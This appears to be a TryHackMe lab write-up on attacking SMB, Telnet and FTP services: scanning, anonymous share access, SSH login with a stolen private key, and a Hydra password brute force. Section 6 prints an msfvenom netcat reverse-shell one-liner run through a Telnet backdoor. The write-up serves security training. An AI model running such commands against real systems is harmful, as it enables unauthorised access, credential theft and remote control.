# Network Services — TryHackMe

Note: All target IP addresses in this write-up are shown as `<IP_ADDRESS>`, because the lab target IP changes between sessions.

## 1. Port Scanning

I used Nmap with `-Pn` to identify open ports on the lab target. The `-Pn` option skips host discovery and treats the target as online.

### Command Used

```bash
nmap -Pn <IP_ADDRESS>
```

### Scan Results

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-24 16:01 -0700
Nmap scan report for <IP_ADDRESS>
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
```

I found ports `139` and `445` interesting because they are associated with SMB. That suggested the target might be running an SMB server, such as a Samba implementation, so identifying the SMB service and version became the next step, documented in Section 2. The open ports alone do not confirm Samba or any specific version, and the service names above are Nmap's port labels, not confirmed software versions.

### Note on Non-Standard Ports

A scan that does not cover the full port range will not show services running on non-standard ports. Services can run on ports other than their usual ones, so a port that is not scanned can hide a service entirely. This is a reason to scan fully rather than relying only on a default port list.

## 2. Service Enumeration

### SMB

SMB is a request-response protocol that allows clients and servers to communicate over TCP/IP, typically to share files, printers, and other resources over a network. The client sends a request, and the server responds to it.

### Telnet

Telnet is another client-server communication protocol. Unlike SMB, which is mainly used for sharing files, printers, and other resources over a network, Telnet is mainly used for remote terminal control: a client connects to a server and controls its terminal remotely.

The Telnet step from this lab is recorded later in this file, after the full port scan.

### Workgroup Enumeration with enum4linux

### Command Used

```bash
enum4linux -a <IP_ADDRESS>
```

### Results

The enumeration returned the domain/workgroup name:

```text
WORKGROUP
```

This gave a workgroup name to use for further SMB enumeration, rather than assuming a domain name.

### Machine Identification from srvinfo

Further enumeration for `<IP_ADDRESS>` returned OS information from srvinfo. The machine name was `POLOSMB`, and the server was identified as Samba on Ubuntu:

```text
POLOSMB        Wk Sv PrQ Unx NT SNT POLOSMB server (Samba, Ubuntu)
platform_id     :       500
os version      :       6.1
server type     :       0x809a03
```

This confirms the earlier possibility raised by ports `139` and `445`: the SMB service here is Samba, not merely a service suggested by open ports.

### SMB Share Listing

The share listing for `<IP_ADDRESS>` returned the following shares:

```text
Sharename       Type      Comment
---------       ----      -------
netlogon        Disk      Network Logon Service
profiles        Disk      Users profiles
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (POLOSMB server (Samba, Ubuntu))
```

The listing also included an SMB1 negotiation message:

```text
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server <IP_ADDRESS> (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

This SMB1 failure occurred during the subsequent workgroup-listing attempt. It does not invalidate the share list already returned.

The `profiles` share stood out because it is described as Users profiles, which may contain user-related data. Investigating that share became the next step of interest.

### Accessing the profiles Share as Anonymous

Using the information from the share listing, I connected to the `profiles` share as an anonymous user, without supplying a password.

### Command Used

```bash
smbclient //<IP_ADDRESS>/profiles -U anonymous -p 445
```

- `-U anonymous`: specify the anonymous username.
- `-p 445`: specify the SMB port.

This connection used the `profiles` share identified in the earlier share listing, rather than assuming access to a different share.

### Listing the profiles Share

After connecting as anonymous, I listed the contents of the `profiles` share:

```text
smb: \> ls
  .                                   D        0  Tue Apr 21 04:08:23 2020
  ..                                  D        0  Tue Apr 21 03:49:56 2020
  .cache                             DH        0  Tue Apr 21 04:08:23 2020
  .profile                            H      807  Tue Apr 21 04:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 04:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 04:08:23 2020
  .viminfo                            H      947  Tue Apr 21 04:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 04:08:23 2020
  .ssh                               DH        0  Tue Apr 21 04:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 04:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 04:08:23 2020

                15373236 blocks of size 1024. 7030416 blocks available
```

I also confirmed the current directory:

```text
smb: \> pwd
Current directory is \\<IP_ADDRESS>\profiles\
```

The listing shows a user-like home directory, including hidden files and directories such as `.ssh` and `.gnupg`, and a file named `Working From Home Information.txt`. This listing alone does not record the contents of those files.

### Downloading and Reading Working From Home Information.txt

From the `profiles` share, I downloaded the file `Working From Home Information.txt` to my local machine:

```text
smb: \> get "working From Home Information.txt"
```

I then read the downloaded file locally:

```bash
cat working\ From\ Home\ Information.txt
```

### Findings

The file was a note from James, Department Manager, to John Cactus. It said that, because of the pandemic, most of POLO inc. had moved to working from home where possible, and that John Cactus's account had been enabled with SSH access to the main server. For problems, it directed the reader to contact the IT department.

This gave a concrete next lead: an employee account, John Cactus, with SSH access to the main server, rather than only an anonymous SMB share listing.

## 3. Initial Access via SSH with a Private Key

The SSH lead from `Working From Home Information.txt` pointed to John Cactus's account. Inside the `profiles` share, I entered the `.ssh` directory and listed it:

```text
smb: \> cd .ssh
smb: \.ssh\> ls
  .                                   D        0  Tue Apr 21 04:08:23 2020
  ..                                  D        0  Tue Apr 21 03:49:56 2020
  id_rsa                              N     1679  Tue Apr 21 04:08:23 2020
  id_rsa.pub                          N      396  Tue Apr 21 04:08:23 2020
  authorized_keys                     N        0  Tue Apr 21 04:08:23 2020
```

I downloaded the private key file `id_rsa` from that directory to my local machine. The private key content itself is not reproduced here.

I then used that private key as the SSH identity to log in as user `cactus`:

```bash
ssh -i id_rsa cactus@<IP_ADDRESS>
```

This worked because the private key matched the account's SSH authentication, turning the anonymous SMB access into authenticated SSH access. Note that this was a private key, not a password hash.

After logging in, I found and read `smb.txt` in the account's home directory:

```bash
cactus@POLOSMB:~$ cat smb.txt
```

That file contained the SMB flag. The flag value is intentionally omitted from this write-up.

## 4. Full Port Scan and Telnet Backdoor

This step puts the earlier note on non-standard ports into practice: a full scan found a service that a default scan would not necessarily surface.

### Full Port Scan

```bash
nmap -p- <IP_ADDRESS>
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-25 16:25 -0700
Nmap scan report for <IP_ADDRESS>
Host is up (0.035s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
8012/tcp open  unknown
```

Only one open port was found, `8012/tcp`, and Nmap labeled its service as `unknown`. That label does not identify the service; it only means Nmap did not recognize it from the port number, which fits a non-standard port.

### Connecting with Telnet

I then connected to port `8012` with Telnet:

```bash
telnet <IP_ADDRESS> 8012
```

```text
Trying <IP_ADDRESS>...
Connected to <IP_ADDRESS>.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```

The banner identified the service on port `8012` as SKIDY'S BACKDOOR, and pointed to `.HELP` for its commands. Running `.HELP` itself is not recorded here yet.

## 5. Verifying Backdoor Access with tcpdump and ICMP

To test whether the Telnet backdoor was actually usable, I ran a tcpdump listener and used the backdoor's `.RUN` command to make the target send ICMP traffic back to my listener. If the listener captured that traffic, it would confirm the backdoor could execute commands and reach my machine.

### Backdoor Commands

After reconnecting to the backdoor on port `8012`, I ran:

```text
SKIDY'S BACKDOOR. Type .HELP to view commands
.RUN ping <IP_ADDRESS> -c 1
.RUN ping 192.168.128.110 -c 1
```

Here, `192.168.128.110` was my listener-side address on `tun0`, while `<IP_ADDRESS>` is the lab target, shown with the unified placeholder used throughout this write-up.

### tcpdump Listener

On my machine, I listened for ICMP traffic on `tun0`:

```bash
sudo tcpdump ip proto icmp -i tun0
```

```text
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:17:03.098898 IP <IP_ADDRESS> > 192.168.128.110: ICMP echo request, id 2, seq 1, length 64
20:17:03.098981 IP 192.168.128.110 > <IP_ADDRESS>: ICMP echo reply, id 2, seq 1, length 64
```

### Interpretation

The listener captured an ICMP echo request from the target to `192.168.128.110`, followed by an ICMP echo reply back to the target. That round trip confirmed the target could hear and respond to my machine through the backdoor path: the backdoor was not just a banner, it could execute a command and produce network traffic back to the listener.


## 6. Reverse Shell via the Telnet Backdoor

After confirming in Section 5 that the backdoor could execute commands and reach my machine, I used it to obtain a reverse shell.

### Listener

On my machine, I started a Netcat listener on port `4444`:

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

### Generating the Payload with msfvenom

I used msfvenom to generate a reverse Netcat command pointing back to my listener address `192.168.128.110` on port `4444`:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.110 lport=4444 R
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 93 bytes
mkfifo /tmp/oyhn; nc 192.168.128.110 4444 0</tmp/oyhn | /bin/sh >/tmp/oyhn 2>&1; rm /tmp/oyhn
```

This payload works because it creates a named pipe, connects Netcat back to the listener, and pipes a shell through it, so input and output both flow over the same connection.

### Running the Payload Through the Backdoor

I reconnected to the backdoor on port `8012` and ran the payload with its `.RUN` command:

```bash
telnet <IP_ADDRESS> 8012
```

```text
Trying <IP_ADDRESS>...
Connected to <IP_ADDRESS>.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.RUN mkfifo /tmp/oyhn; nc 192.168.128.110 4444 0</tmp/oyhn | /bin/sh >/tmp/oyhn 2>&1; rm /tmp/oyhn
```

Note that only `.RUN` was used here; running `.HELP` itself is not recorded.

### Shell Received

The listener then showed an incoming connection from the target, giving me a shell:

```text
listening on [any] 4444 ...
connect to [192.168.128.110] from (UNKNOWN) [<IP_ADDRESS>] 50562
```

Listing the directory showed `flag.txt` (alongside `snap`), and reading it with `cat flag.txt` gave the Telnet flag. The flag value is intentionally omitted from this write-up.

## 7. FTP: Active vs Passive

FTP is another protocol where the direction of the data connection matters, and it can be understood by analogy with shell types:

- **Active FTP resembles a reverse shell**: the server initiates the data connection back to the client.
- **Passive FTP resembles a bind shell**: the client initiates the data connection to the server.

In both cases, the key distinction is who initiates the data connection, not just who starts the session.

The FTP step from this lab is recorded in Section 8.

## 8. FTP Service Enumeration and Anonymous Login

### Service Version Scan

I used Nmap with `-sV` to identify service versions on the target:

```bash
nmap -sV <IP_ADDRESS>
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-27 20:24 -0700
Nmap scan report for <IP_ADDRESS>
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This confirmed the FTP service on its standard port `21/tcp`, running vsftpd 2.0.8 or later, rather than only inferring FTP from an open port.

### Anonymous Login

I then connected to the FTP server as anonymous, with a blank password:

```bash
ftp <IP_ADDRESS>
```

```text
Connected to <IP_ADDRESS>.
220 Welcome to the administrator FTP service.
Name: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

The login succeeded without a real password, showing anonymous FTP access was allowed.

### Listing the Server

Listing the server contents returned one file:

```text
ftp> ls
229 Entering Extended Passive Mode (|||62256|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
```

### Downloading and Reading PUBLIC_NOTICE.txt

I downloaded that file to my local machine:

```text
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
229 Entering Extended Passive Mode (|||22019|)
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
226 Transfer complete.
353 bytes received in 00:00 (10.51 KiB/s)
```

Reading it locally showed a message from the system administrators:

```bash
cat PUBLIC_NOTICE.txt
```

```text
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available
over the weekend- we will be
carrying out routine system
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike
```

### Finding

The notice was signed by Mike, giving a person's name associated with the FTP service. The notice itself does not contain a flag, but it identifies Mike as a contact or account holder to investigate further.

## 9. Security Note: FTP and Telnet Are Unencrypted

Both FTP and Telnet send their commands, channels, and communications unencrypted. That means the traffic is in plaintext, not protected by encryption.

As a result, an attacker in a man-in-the-middle position on the network path could see everything passing over those connections, including commands and transferred data.

This is a general security property of these protocols, not a man-in-the-middle attack performed in this lab.

## 10. Cracking Mike's FTP Password with Hydra and Retrieving ftp.txt

The name Mike from `PUBLIC_NOTICE.txt` gave a username to try against the FTP service.

### Password Cracking with Hydra

I ran Hydra online against the FTP service, using the username `mike` and the rockyou wordlist:

```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <IP_ADDRESS> ftp
```

```text
Hydra v9.6 starting at 2026-10-28 19:54:01
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://<IP_ADDRESS>:21/
[STATUS] attack finished for <IP_ADDRESS> (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-10-28 19:54:16
```

Hydra found a valid password very quickly, within about 15 seconds. The password value itself is intentionally omitted from this write-up, following the rule not to record passwords.

This worked because the account used a weak password that appeared early in the wordlist, so online guessing succeeded without needing a long brute-force run.

### Logging in as Mike

Using the cracked password, I logged in to FTP as `mike`:

```bash
ftp <IP_ADDRESS>
```

```text
Connected to <IP_ADDRESS>.
220 Welcome to the administrator FTP service.
Name: mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

### Listing and Downloading ftp.txt

Listing Mike's FTP directory returned:

```text
ftp> ls
229 Entering Extended Passive Mode (|||29948|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
```

Trying `cat` inside the FTP client failed, because `cat` is not an FTP command:

```text
ftp> cat ftp.txt
?Invalid command.
```

So I downloaded the file first, then read it locally:

```text
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
229 Entering Extended Passive Mode (|||27110|)
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
226 Transfer complete.
26 bytes received in 00:00 (0.21 KiB/s)
```

```bash
cat ftp.txt
```

That file contained the FTP flag. The flag value is intentionally omitted from this write-up.
